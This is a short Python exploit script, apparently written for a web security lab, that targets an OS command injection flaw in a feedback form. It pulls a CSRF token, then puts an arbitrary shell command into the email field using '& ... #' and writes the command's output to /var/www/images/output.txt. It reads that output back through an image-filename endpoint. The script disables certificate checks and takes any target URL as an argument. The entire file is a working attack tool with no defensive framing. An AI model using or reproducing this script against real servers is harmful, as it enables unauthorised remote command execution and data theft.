import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def get_csrf_token(s,url):
    feed_path = '/feedback'
    r = s.get(url + feed_path,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def command_injection(s,url,command):
    path = '/feedback/submit'
    command_injection = 'tesemail@test.com & %s > /var/www/images/output.txt #' %command
    csrf_token = get_csrf_token(s, url)
    data = {'csrf':csrf_token,'name':'test','email':command_injection,'subject':'test','message':'test'}
    s.post(url+path,data=data,verify=False,proxies=proxies)
    print("(+) Verifying if command injection exploit worked...")

    #getting output
    out_path = '/image?filename=output.txt'
    re = s.get(url+out_path,verify=False,proxies=proxies)
    if len(re.text) > 1:
        print("(+) Exploit Successfull")
        print(re.text)
    else:
        print("(-) Exploit unsuccessfull")

def main():
    if len(sys.argv) != 3:
        print("Usages: %s <url> <command>" %sys.argv[0])
        print("Example: %s www.example.com whoami" %sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    command = sys.argv[2]

    print("(+) Exploiting Command injection......")
    s = requests.session()
    command_injection(s,url,command)


if __name__ == "__main__":
    main()